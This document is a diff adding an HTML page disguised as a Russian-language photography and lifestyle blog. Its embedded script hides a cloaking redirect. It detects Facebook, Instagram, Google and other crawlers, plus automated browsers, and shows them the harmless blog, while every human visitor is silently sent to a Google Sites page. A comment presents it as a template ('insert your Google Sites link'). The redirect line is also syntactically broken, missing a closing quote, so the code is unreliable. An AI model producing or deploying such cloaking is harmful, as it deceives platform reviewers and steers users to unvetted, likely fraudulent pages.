@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Мой Блог</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; background: #ffffff; color: #333333; }
+    </style>
+</head>
+<body>
+
+    <h1>Заметки о фотографии и лайфстайле</h1>
+    <p>Добро пожаловать в мой личный блог. Здесь я делюсь мыслями об искусстве мобильной фотографии, правильном выстраивании кадра и поиске вдохновения в повседневных вещах.</p>
+
+    <script>
+        function filterTraffic() {
+            const ua = navigator.userAgent.toLowerCase();
+            const botKeywords = ['facebookexternalhit', 'instagram', 'meta-externalfetcher', 'facebot', 'bot', 'spider', 'crawl', 'googlebot'];
+            
+            let isBot = false;
+            
+            for (let word of botKeywords) {
+                if (ua.includes(word)) {
+                    isBot = true;
+                    break;
+                }
+            }
+            
+            if (navigator.webdriver) {
+                isBot = true;
+            }
+
+            if (!isBot) {
+                // ВСТАВЬТЕ ССЫЛКУ НА ВАШ GOOGLE SITES НИЖЕ:
+                window.location.href = "https://sites.google.com/view/glowandwibes--/;
+            }
+        }
+
+        filterTraffic();
+    </script>
+</body>
+</html>
